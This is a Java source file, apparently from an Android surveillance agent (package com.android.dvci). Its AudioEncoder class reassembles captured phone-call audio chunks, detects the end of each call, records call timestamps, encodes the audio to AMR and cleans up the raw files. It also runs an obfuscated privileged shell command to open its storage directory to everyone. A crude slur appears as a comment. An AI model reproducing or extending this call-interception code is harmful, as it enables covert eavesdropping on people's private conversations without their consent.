package com.android.dvci.util;

import android.media.AmrInputStream;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.Configuration;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.resample.Resample;
import com.android.mm.M;
import com.musicg.wave.Wave;
import com.musicg.wave.WaveHeader;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Date;

// HIC SUNT RICCHIONES
public class AudioEncoder {
	private static final String TAG = "AudioEncoding";
	private static String audioDirectory = "l4/";
	private static String audioStorage;
	private boolean call_finished;
	private int last_epoch = 0, first_epoch = 0, data_size = 0;
	private int sampleRate = 44100;
	private String rawFile;
	private byte[] rawPcm;

	public AudioEncoder(String f) {
		rawFile = f;

		try {
			rawPcm = decodeRawChunks();
		} catch (IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		}
	}

	public int getInferredSampleRate() {
		float min = Float.MAX_VALUE;
		int bitrates[] = {8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 176400, 192000, 352800, 384000};
		int calc = -1;

		int delta = last_epoch - first_epoch;

		if (delta <= 0 || data_size <= 0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getInferredSampleRate): delta is " + delta + " (first_epoch: " + first_epoch + ", last_epoch: "
						+ last_epoch + "), data_size is: " + data_size + ", bitrate cannot be guessed");
			}
			return -1;
		}

		int bitrate = (data_size / 2) / delta; // 16-bit PCM

		// Calculate the closest possible real value, yep it can be optimized:
		// if t > min: return prev_bitrate
		for (int b : bitrates) {
			float t = (float) bitrate / (float) b;

			t = Math.abs(1.0f - t);

			if (t < min) {
				calc = b;
				min = t;
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + "(getInferredSampleRate): bitrate declared: " + bitrate + " bitrate inferred: " + calc);
		}

		// If we are in a certain difference range, we can reliably assume that
		// declared bitrate it truthful
		// Watch it, because declared bitrate might be (and will often be)
		// completely different from the real one.
		float ref, bit;

		if (bitrate > calc) {
			ref = (float) bitrate;
			bit = (float) calc;
		} else {
			ref = (float) calc;
			bit = (float) bitrate;
		}

		float perc = (1.0f - (bit / ref)) * 100.0f;

		if (perc > 5.0f) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getInferredSampleRate): declared bitrate of " + bitrate + " seems to be false (skew: "
						+ (int) perc + "%), assuming: " + calc);
			}

			return calc;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getInferredSampleRate): declared bitrate of " + bitrate + " seems to be thrutful (skew: "
						+ (int) perc + "%), using it");
			}

			return bitrate;
		}
	}

	public boolean encodetoAmr(String outFile, byte[] raw) {
		if (raw == null || raw.length == 0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(encodetoAmr): Cannot encode null data");
			}

			return false;
		}

		File file = new File(outFile);

		if (Cfg.DEBUG) {
			Check.log(TAG + "(encodetoAmr): Encoding raw to: " + file.getName());

		}

		try {
			InputStream inStream = new ByteArrayInputStream(raw);
			AmrInputStream aStream = new AmrInputStream(inStream);

			file.createNewFile();

			OutputStream out = new FileOutputStream(file);

			out.write(0x23);
			out.write(0x21);
			out.write(0x41);
			out.write(0x4D);
			out.write(0x52);
			out.write(0x0A);

			byte[] buf = new byte[4096];
			int len;

			while ((len = aStream.read(buf)) > 0) {
				out.write(buf, 0, len);
			}

			out.close();
			aStream.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		return true;
	}

	public byte[] resample(boolean realRate) {
		int bitRate;

		if (rawPcm == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(resample): No decoded audio data found");
			}

			return null;
		}

		// Ideally the sample rate should be the same for every chunk...
		// Ideally...
		if (realRate == true) {
			bitRate = getAllegedSampleRate();
		} else {
			bitRate = getInferredSampleRate();

			// Borderline case in which we are unable to infer the real value
			if (bitRate < 0) {
				bitRate = getAllegedSampleRate();
			}
		}

		WaveHeader header = Resample.createHeader(bitRate, rawPcm.length);

		// Resample audio
		Wave wave = Resample.resampleRaw(header, rawPcm);
		if(wave == null){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (resample), Invalid raw sample, samplerate is zero");
			}
			return new byte[]{};
		}

		return wave.getBytes();
	}

	private byte[] decodeRawChunks() throws IOException {
		int end_of_call = 0xF00DF00D;
		int epoch, streamType, blockLen;
		int discard_frame_size = 8;

		first_epoch = last_epoch = data_size = 0;
		rawPcm = null;
		sampleRate = 44100;

		// header format - each field is 4 bytes LE:
		// epoch : streamType : sampleRate : blockLen
		File raw = new File(rawFile);

		FileInputStream in = null;

		try {
			in = new FileInputStream(raw);

			byte data[] = new byte[(int) raw.length()];
			in.read(data, 0, (int) raw.length());

			ByteBuffer d = ByteBuffer.wrap(data);
			d.order(ByteOrder.LITTLE_ENDIAN);

			data = null;

			if (Cfg.DEBUG) {
				Check.log(TAG + "(encodeChunks): Parsing " + raw.getName());
			}

			// First round calculates the bitrate and real size of audio data
			while (d.remaining() > 0) {
				int cur_epoch = d.getInt();

				d.position(d.position() + discard_frame_size); // Discard streamType and
				// sampleRate
				blockLen = d.getInt();
				if (blockLen < 0 || blockLen > d.remaining()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (decodeRawChunks), OUT of BAND, blockLen: "+ blockLen + " remaining: "+ d.remaining());
					}
					break;
				}

				// Discarded bytes must be discarded in the next loop too
				if (blockLen != discard_frame_size) {
					if (first_epoch == 0) {
						first_epoch = cur_epoch;
					}

					data_size += blockLen; // Get blockLen
					last_epoch = cur_epoch;
				}

				if (Cfg.DEBUG) {
					//Check.log(TAG + "(encodeChunks): blockLen: " + blockLen +
					//		" remaining: " + d.remaining() + " current position: " +
					//		d.position() + " next position: " + (d.position() +
					//		blockLen));
				}

				d.position(d.position() + blockLen);
			}

			// Let's start again
			d.rewind();

			if (Cfg.DEBUG) {
				Check.log(TAG + "(encodeChunks): raw data size: " + data_size + " bytes, file length: "
						+ (last_epoch - first_epoch) + " seconds");

			}

			rawPcm = new byte[data_size];

			int pos = 0;
			call_finished = false;

			// Second round extracts only the audio data
			while (d.remaining() > 0) {
				epoch = d.getInt();
				if(Cfg.DEBUG){
					Check.asserts(epoch <= last_epoch, "Last_epoch not correct");
				}
				streamType = d.getInt();
				sampleRate = d.getInt();
				//pid = d.getInt();
				blockLen = d.getInt();

				if (Cfg.DEBUG) {
					// Check.log(TAG + "(encodeChunks): epoch: " + epoch +
					// " streamType: " + streamType + " sampleRate: " +
					// sampleRate + " blockLen: " + blockLen);
				}

				if (streamType == end_of_call && blockLen == 0 || blockLen > d.remaining()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(encodeChunks): end of call reached for " + raw.getName());
					}

					call_finished = true;

					if (d.remaining() > 0) {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(encodeChunks): ***WARNING*** end of call reached and we still have "
									+ d.remaining() + " remaining bytes!");
						}
					}

					continue;
				}

				if (blockLen == discard_frame_size) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(encodeChunks): skipping misterious frame (length: " + blockLen + " bytes)");
					}

					d.position(d.position() + blockLen);
					continue;
				}

				byte[] rawPcmBlock = new byte[blockLen];
				d.get(rawPcmBlock);

				System.arraycopy(rawPcmBlock, 0, rawPcm, pos, rawPcmBlock.length);
				pos += blockLen;
			}

			return rawPcm;

		} finally {
			if (in != null) {
				in.close();
			}
		}
	}

	public void removeRawFile() {
		if (rawFile.length() == 0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(removeRawFile): file name not set, cannot remove");
			}

			return;
		}

		AutoFile raw = new AutoFile(rawFile);
		if (Cfg.DEBUG) {
			Check.log(TAG + "(removeRawFile): " + rawFile);
		}
		raw.delete();
	}

	public int getCallStartTime() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCallStartTime): " + new Date(first_epoch * 1000L));
		}
		return first_epoch;
	}

	public int getCallEndTime() {
		return last_epoch;
	}

	public int getCallDastaSize() {
		return data_size;
	}

	public int getAllegedSampleRate() {
		return sampleRate;
	}

	public boolean isLastCallFinished() {
		return call_finished;
	}

	static public boolean createAudioStorage() {
		// Create storage directory
		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;

		if (Path.createDirectory(audioStorage) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createAudioStorage): audio storage directory cannot be created"); //$NON-NLS-1$
			}

			return false;
		} else {
			Execute.execute(Configuration.shellFile + " " + M.e("pzm 777 ") + audioStorage);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (createAudioStorage): audio storage directory created at " + audioStorage); //$NON-NLS-1$
			}

			return true;
		}
	}

	static public String getAudioStorage() {
		if (audioStorage.length() == 0) {
			createAudioStorage();
		}

		return audioStorage;
	}

	static public boolean deleteAudioStorage() {
		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;

		boolean ret = false;

		File f = new File(audioStorage);
		if (f.exists() && f.isDirectory()) {
			for (File file : f.listFiles()) {
				file.delete();
			}
			ret = true;
		}

		return ret;
	}

	static private String getAudioDirectoryName() {
		return audioDirectory;
	}
}
